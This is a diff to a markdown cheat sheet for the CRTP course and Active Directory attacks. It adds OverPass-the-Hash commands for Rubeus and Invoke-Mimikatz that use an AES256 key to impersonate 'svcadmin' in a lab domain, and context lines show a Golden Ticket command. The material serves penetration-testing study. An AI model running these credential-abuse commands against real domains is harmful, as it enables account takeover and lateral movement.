@@ -24,6 +24,7 @@ Command/tooling reference material useful for the CRTP course and Active Directo
      - [Constrained Delegation](#Constrained-Delegation)
      - [Golden Ticket](#Golden-Ticket)
      - [Silver Ticket](#Silver-Ticket)
+     - [OverPass-the-Hash](#OverPass-the-Hash)
    - [Credential Access](#Credential-Access)
      - [Mimikatz](#Mimikatz)
    - [Lateral Movement](#Lateral-Movement)
@@ -267,6 +268,18 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:d
 1874506631-3219952063-538504511 /aes256:e28b3a5c60e087c8489a410a1199235efaf3b9f125972c7a1e7618a7469bfd6a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 ### Silver Ticket
+### OverPass-the-Hash
+#### Rubeus
+```powershell 
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+#### Invoke-Mimikatz
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:powershell.exe"'
+```
+#### Kekeo
+```powershell
+```
 ## Credential Access 
 I would recommend becoming familiar with different tooling that can be used to dump creds. 
 ### Mimikatz 
